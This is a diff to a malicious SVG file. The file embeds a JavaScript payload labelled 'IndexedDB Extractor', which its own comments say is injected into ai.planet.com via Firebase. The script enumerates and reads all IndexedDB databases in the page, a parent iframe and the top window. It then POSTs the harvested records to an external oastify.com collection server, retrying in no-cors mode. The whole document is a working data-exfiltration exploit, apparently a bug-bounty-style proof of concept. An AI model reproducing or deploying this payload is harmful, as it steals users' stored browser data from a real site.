@@ -2,32 +2,42 @@
     <defs>
         <style>
             text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+            .log-text { font-family: monospace; font-size: 12px; }
         </style>
         <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="0%">
-            <stop offset="0%" style="stop-color:#1a237e;stop-opacity:1" />
-            <stop offset="100%" style="stop-color:#0d47a1;stop-opacity:1" />
+            <stop offset="0%" stop-color="#1a237e" stop-opacity="1" />
+            <stop offset="100%" stop-color="#0d47a1" stop-opacity="1" />
         </linearGradient>
     </defs>
     
+    <!-- Main background -->
     <rect width="1200" height="800" fill="#f5f7fa" rx="12"/>
-    <rect x="0" y="0" width="1200" height="50" fill="url(#headerGrad)" rx="12 12 0 0"/>
+    
+    <!-- Header - FIXED: removed "12 12 0 0", using single rx value -->
+    <rect x="0" y="0" width="1200" height="50" fill="url(#headerGrad)" rx="12"/>
+    
+    <!-- Header text -->
     <text x="30" y="32" fill="white" font-size="18" font-weight="bold">🗄️ IndexedDB Extractor</text>
     <text x="950" y="32" fill="white" font-size="12" id="statusTime">Loading...</text>
     
+    <!-- Status panel -->
     <rect x="20" y="65" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
     <text x="40" y="90" font-weight="bold" fill="#333" font-size="15">📊 Extraction Status</text>
     
+    <!-- Log output -->
     <foreignObject x="40" y="105" width="1120" height="145">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;">
-            <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;"></div>
+        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;box-sizing:border-box;">
+            <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;word-wrap:break-word;"></div>
         </div>
     </foreignObject>
     
+    <!-- Main content area -->
     <rect x="20" y="280" width="1160" height="500" fill="#e8e8e8" rx="8" stroke="#ccc" stroke-width="1"/>
     <text x="600" y="530" text-anchor="middle" fill="#999" font-size="24">🔍 Scanning IndexedDB...</text>
     
     <script type="text/javascript">
-        <![CDATA[
+        // <![CDATA[
+        (function() {
             console.clear();
             console.log('═══════════════════════════════════════');
             console.log('🗄️ INDEXEDDB EXTRACTOR - PAYLOAD');
@@ -36,17 +46,19 @@
             console.log('📍 URL:', window.location.href);
             console.log('📌 This SVG is injected via script on ai.planet.com');
             
-            const statusLog = document.getElementById('statusLog');
-            const statusTime = document.getElementById('statusTime');
+            var statusLog = document.getElementById('statusLog');
+            var statusTime = document.getElementById('statusTime');
             
-            function logStatus(message, isError = false, isSuccess = false) {
-                const timestamp = new Date().toLocaleTimeString();
-                const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
-                const entry = '[' + timestamp + '] ' + prefix + ' ' + message;
+            function logStatus(message, isError, isSuccess) {
+                isError = isError || false;
+                isSuccess = isSuccess || false;
+                var timestamp = new Date().toLocaleTimeString();
+                var prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
+                var entry = '[' + timestamp + '] ' + prefix + ' ' + message;
                 console.log(entry);
                 if (statusLog) {
-                    const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
-                    statusLog.innerHTML += '<div style="color:' + color + '">' + entry + '</div>';
+                    var color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
+                    statusLog.innerHTML += '<div style="color:' + color + ';">' + entry + '</div>';
                     statusLog.scrollTop = statusLog.scrollHeight;
                 }
                 if (statusTime) {
@@ -54,63 +66,55 @@
                 }
             }
             
-            // ============================================
-            // ACCESS IFRAME'S INDEXEDDB
-            // ============================================
-            
             async function extractIframeIndexedDB() {
-                logStatus('🚀 Starting extraction from iframe IndexedDB...');
+                logStatus('🚀 Starting extraction from iframe IndexedDB...', false, false);
                 
-                // Try to find the iframe - it might be in the parent window
                 var iframe = document.getElementById('planetIframe');
                 
-                // If not in this document, try parent
                 if (!iframe && window.parent) {
                     try {
                         iframe = window.parent.document.getElementById('planetIframe');
-                        logStatus('📌 Found iframe in parent window');
+                        logStatus('📌 Found iframe in parent window', false, false);
                     } catch(e) {
-                        logStatus('⚠️ Cannot access parent iframe', true);
+                        logStatus('⚠️ Cannot access parent iframe', true, false);
                     }
                 }
                 
-                // If still no iframe, try to find any iframe
                 if (!iframe) {
                     try {
                         var iframes = document.getElementsByTagName('iframe');
                         if (iframes.length > 0) {
                             iframe = iframes[0];
-                            logStatus('📌 Found iframe in current document');
+                            logStatus('📌 Found iframe in current document', false, false);
                         }
                     } catch(e) {}
                 }
                 
                 if (!iframe) {
-                    logStatus('❌ No iframe found. Trying direct IndexedDB access...', true);
-                    // Try direct access as fallback
+                    logStatus('❌ No iframe found. Trying direct IndexedDB access...', true, false);
                     return await extractDirectIndexedDB();
                 }
                 
                 try {
                     var targetWindow = iframe.contentWindow;
                     if (!targetWindow) {
-                        logStatus('❌ Cannot access iframe contentWindow', true);
+                        logStatus('❌ Cannot access iframe contentWindow', true, false);
                         return await extractDirectIndexedDB();
                     }
                     
                     var iframeDB = targetWindow.indexedDB;
                     if (!iframeDB) {
-                        logStatus('❌ Cannot access iframe IndexedDB', true);
+                        logStatus('❌ Cannot access iframe IndexedDB', true, false);
                         return await extractDirectIndexedDB();
                     }
                     
                     logStatus('✅ Got iframe IndexedDB reference', false, true);
                     
                     var databases = await iframeDB.databases();
-                    logStatus('📌 Found ' + databases.length + ' databases in iframe');
+                    logStatus('📌 Found ' + databases.length + ' databases in iframe', false, false);
                     
                     if (databases.length === 0) {
-                        logStatus('⚠️ No databases found in iframe', true);
+                        logStatus('⚠️ No databases found in iframe', true, false);
                         return null;
                     }
                     
@@ -118,7 +122,7 @@
                     for (var i = 0; i < databases.length; i++) {
                         var dbInfo = databases[i];
                         var dbName = dbInfo.name;
-                        logStatus('📖 Reading database: ' + dbName);
+                        logStatus('📖 Reading database: ' + dbName, false, false);
                         
                         try {
                             var db = await new Promise(function(resolve, reject) {
@@ -132,7 +136,7 @@
                             
                             for (var j = 0; j < storeNames.length; j++) {
                                 var storeName = storeNames[j];
-                                logStatus('  📖 Reading store: ' + storeName);
+                                logStatus('  📖 Reading store: ' + storeName, false, false);
                                 
                                 var data = await new Promise(function(resolve, reject) {
                                     var tx = db.transaction(storeName, 'readonly');
@@ -161,31 +165,27 @@
                             logStatus('  ✅ ' + dbName + ': ' + storeNames.length + ' stores, ' + totalRecords + ' records', false, true);
                             
                         } catch (error) {
-                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true);
+                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true, false);
                         }
                     }
                     
                     return allData;
                     
                 } catch (error) {
-                    logStatus('❌ Error accessing iframe IndexedDB: ' + error.message, true);
+                    logStatus('❌ Error accessing iframe IndexedDB: ' + error.message, true, false);
                     return await extractDirectIndexedDB();
                 }
             }
             
-            // ============================================
-            // DIRECT INDEXEDDB ACCESS (FALLBACK)
-            // ============================================
-            
             async function extractDirectIndexedDB() {
-                logStatus('🔄 Trying direct IndexedDB access...');
+                logStatus('🔄 Trying direct IndexedDB access...', false, false);
                 
                 try {
                     var databases = await indexedDB.databases();
-                    logStatus('📌 Found ' + databases.length + ' databases directly');
+                    logStatus('📌 Found ' + databases.length + ' databases directly', false, false);
                     
                     if (databases.length === 0) {
-                        logStatus('⚠️ No databases found directly', true);
+                        logStatus('⚠️ No databases found directly', true, false);
                         return null;
                     }
                     
@@ -193,7 +193,7 @@
                     for (var i = 0; i < databases.length; i++) {
                         var dbInfo = databases[i];
                         var dbName = dbInfo.name;
-                        logStatus('📖 Reading direct database: ' + dbName);
+                        logStatus('📖 Reading direct database: ' + dbName, false, false);
                         
                         try {
                             var db = await new Promise(function(resolve, reject) {
@@ -214,36 +214,31 @@
                                     req.onerror = function() { reject(req.error); };
                                 });
                                 dbData[storeName] = data;
-                                logStatus('    📍 ' + storeName + ': ' + data.length + ' records');
+                                logStatus('    📍 ' + storeName + ': ' + data.length + ' records', false, false);
                             }
                             
                             allData[dbName] = dbData;
                             db.close();
                             
                         } catch (error) {
-                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true);
+                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true, false);
                         }
                     }
                     
                     return allData;
                     
                 } catch (error) {
-                    logStatus('❌ Direct IndexedDB access failed: ' + error.message, true);
+                    logStatus('❌ Direct IndexedDB access failed: ' + error.message, true, false);
                     return null;
                 }
             }
             
-            // ============================================
-            // SEND TO SERVER
-            // ============================================
-            
             async function sendToServer(data) {
                 var serverUrl = 'https://ybd4tc4r5ma1zn6x4y8k0w79t0zrnobd.oastify.com/api/indexeddb';
                 
-                logStatus('📤 Sending data to server...');
-                logStatus('📌 Server: ' + serverUrl);
+                logStatus('📤 Sending data to server...', false, false);
+                logStatus('📌 Server: ' + serverUrl, false, false);
                 
-                // Calculate total records
                 var totalRecords = 0;
                 for (var dbName in data) {
                     var db = data[dbName];
@@ -254,8 +249,8 @@
                     }
                 }
                 
-                logStatus('📊 Total records: ' + totalRecords);
-                logStatus('📦 Data size: ' + JSON.stringify(data).length + ' bytes');
+                logStatus('📊 Total records: ' + totalRecords, false, false);
+                logStatus('📦 Data size: ' + JSON.stringify(data).length + ' bytes', false, false);
                 
                 var payload = {
                     source: window.location.origin,
@@ -285,15 +280,14 @@
                         console.log('Server response:', result);
                     } else {
                         var text = await response.text();
-                        logStatus('❌ Server error: ' + response.status + ' - ' + text, true);
+                        logStatus('❌ Server error: ' + response.status + ' - ' + text, true, false);
                     }
                 } catch (error) {
-                    logStatus('❌ Network error: ' + error.message, true);
+                    logStatus('❌ Network error: ' + error.message, true, false);
                     console.error('Network error:', error);
                     
-                    // Try no-cors mode as fallback
                     try {
-                        logStatus('🔄 Trying no-cors mode...');
+                        logStatus('🔄 Trying no-cors mode...', false, false);
                         await fetch(serverUrl, {
                             method: 'POST',
                             mode: 'no-cors',
@@ -302,23 +296,18 @@
                         });
                         logStatus('✅ Request sent (no-cors) - check server logs', false, true);
                     } catch (e2) {
-                        logStatus('❌ No-cors failed: ' + e2.message, true);
+                        logStatus('❌ No-cors failed: ' + e2.message, true, false);
                     }
                 }
             }
             
-            // ============================================
-            // MAIN EXECUTION
-            // ============================================
-            
             async function main() {
-                logStatus('═══════════════════════════════════════');
-                logStatus('🚀 Starting IndexedDB extraction...');
-                logStatus('📍 Origin: ' + window.location.origin);
-                logStatus('📌 This SVG was injected from Firebase');
+                logStatus('═══════════════════════════════════════', false, false);
+                logStatus('🚀 Starting IndexedDB extraction...', false, false);
+                logStatus('📍 Origin: ' + window.location.origin, false, false);
+                logStatus('📌 This SVG was injected from Firebase', false, false);
                 
-                // Wait for page to fully load
-                logStatus('⏳ Waiting 3 seconds...');
+                logStatus('⏳ Waiting 3 seconds...', false, false);
                 await new Promise(function(resolve) { setTimeout(resolve, 3000); });
                 
                 var data = await extractIframeIndexedDB();
@@ -327,12 +316,11 @@
                     logStatus('✅ Data extracted successfully!', false, true);
                     await sendToServer(data);
                 } else {
-                    logStatus('⚠️ No data extracted', true);
-                    logStatus('💡 Trying to find IndexedDB in any context...');
+                    logStatus('⚠️ No data extracted', true, false);
+                    logStatus('💡 Trying to find IndexedDB in any context...', false, false);
                     
-                    // Try one more time with a different approach
                     try {
-                        logStatus('🔄 Checking all windows for IndexedDB...');
+                        logStatus('🔄 Checking all windows for IndexedDB...', false, false);
                         var allWindows = [window];
                         try { if (window.parent && window.parent !== window) allWindows.push(window.parent); } catch(e) {}
                         try { if (window.top && window.top !== window) allWindows.push(window.top); } catch(e) {}
@@ -383,12 +371,11 @@
                     } catch(e) {}
                 }
                 
-                logStatus('✅ Extraction complete');
-                logStatus('═══════════════════════════════════════');
+                logStatus('✅ Extraction complete', false, true);
+                logStatus('═══════════════════════════════════════', false, false);
             }
             
-            // Start when DOM is ready
-            logStatus('⏳ Initializing...');
+            logStatus('⏳ Initializing...', false, false);
             if (document.readyState === 'complete') {
                 setTimeout(main, 1000);
             } else {
@@ -396,6 +383,7 @@
                     setTimeout(main, 1000);
                 });
             }
-        ]]>
+        })();
+        // ]]>
     </script>
 </svg>
